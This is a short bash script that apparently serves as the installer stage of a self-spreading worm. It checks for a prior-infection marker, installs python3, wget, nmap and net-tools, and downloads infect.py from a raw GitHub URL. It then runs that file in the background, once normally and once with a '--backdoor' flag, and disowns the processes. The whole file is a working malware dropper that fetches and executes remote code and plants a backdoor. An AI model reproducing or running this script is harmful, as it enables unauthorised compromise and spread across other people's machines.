#!/bin/bash
# cehck if system not already compromised, in future, check for package
if [ -e /tmp/infect.py ]
then exit
fi 
#fingerprint
apt-get update
apt-get install python3 -y
apt-get install wget -y
apt-get install nmap -y
apt-get install net-tools -y

#download infect
wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py

#shoot
cd /usr/bin
python3 /tmp/infect.py > /tmp/debug 2>&1 &# redicretcing stnd out into debug AND telling bash to redirect all err in stnd out, now into debug
python3 /tmp/infect.py --backdoor &
disown -a # what should happen is bg first immidietly backdoor and then immidietyl disowned
